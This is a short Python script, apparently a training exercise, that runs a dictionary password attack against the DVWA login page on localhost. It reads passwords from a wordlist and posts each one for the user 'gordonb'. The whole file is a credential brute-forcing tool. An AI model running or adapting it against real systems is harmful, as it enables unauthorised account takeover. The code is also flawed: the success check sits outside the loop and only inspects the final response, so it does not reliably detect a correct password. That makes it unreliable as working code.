#!/usr/bin/env python

import requests
import time

lines = tuple(open("dico.txt", "r"))

for line in lines:
	time.sleep(1)
	password = line.replace("\n","")

	print("Password test:", password)

	r = requests.post("http://localhost/dvwa/login.php", 
		data = {'username' : 'gordonb', 'password' : password, 'Login': 'login'})
	
	print(r.status_code)

if r.history:
	for resp in r.history:
		if r.url != 'http://localhost/dvwa/login.php':
			print("The password is: ", password)
			raise SystemExit(0)